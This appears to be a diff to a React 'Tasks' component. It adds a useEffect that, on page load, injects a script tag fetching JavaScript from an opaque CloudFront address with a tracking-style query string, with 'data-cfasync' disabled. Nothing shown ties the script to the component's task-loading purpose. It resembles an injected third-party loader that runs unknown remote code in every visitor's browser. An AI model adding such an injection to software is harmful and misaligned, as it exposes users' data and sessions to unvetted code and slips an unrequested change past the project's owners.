@@ -121,6 +121,20 @@ export function Tasks() {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
+    const script = document.createElement('script');
+    script.src = '//dcbbwymp1bhlf.cloudfront.net/?wbbcd=1483467';
+    script.setAttribute('data-cfasync', 'false');
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      if (document.body.contains(script)) {
+        document.body.removeChild(script);
+      }
+    };
+  }, []);
+
+  useEffect(() => {
     if (!user) return;
 
     const fetchTasks = async () => {
